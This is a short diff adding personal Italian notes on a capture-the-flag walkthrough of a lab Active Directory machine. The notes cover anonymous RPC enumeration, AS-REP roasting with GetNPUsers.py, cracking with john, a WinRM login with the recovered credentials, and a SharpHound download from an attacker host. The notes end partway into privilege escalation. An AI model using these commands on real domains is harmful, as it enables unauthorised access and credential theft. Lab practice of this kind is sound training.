@@ -1,0 +1,32 @@
+Prima porte che noto smb, ldap e Kerberos
+smb nulla, vuoto
+Ha senso anche provare rpc login di tipo Anonymous con:
+rpcclient 10.10.10.161 -U%
+Sono dentro
+Con comando enumdomusers elenco tutti gli users
+Elimino tutto il resto tranne il contenuto delle parentesi quadre che corrisponde al nome degli users
+
+Visto che c'è Kerberos ha senso provare la tecnica seguente.
+Con lo script GetNPUsers.py presente in impacket controllo che gli user che ho trovato abbiano attiva la preauthentication, altrimenti posso trovale la hash e ricavare la password
+
+/GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.10.161
+Vado in htb.local/ directory trovata da nmap
+Ho trovato una hash
+
+Posso trovare la password con john
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+Ho trovato la password. È una macchina windows quindi posso entare con WinRM
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+
+tree /l per trovare file
+Ho la user flag
+
+PRIVESC
+Provo con il tool bloodhound per cercare misconfiguration nella active directory
+
+iwr http://10.10.14.10/SharpHound.ps1 -outf .\SharpHound.ps1
+
+Invoke-Bloodhound -CollectionMethod All -LDAPPort 389 -LDAPUser svc-alfresco -LDAPPass s3rvice
+
+smbclient.py
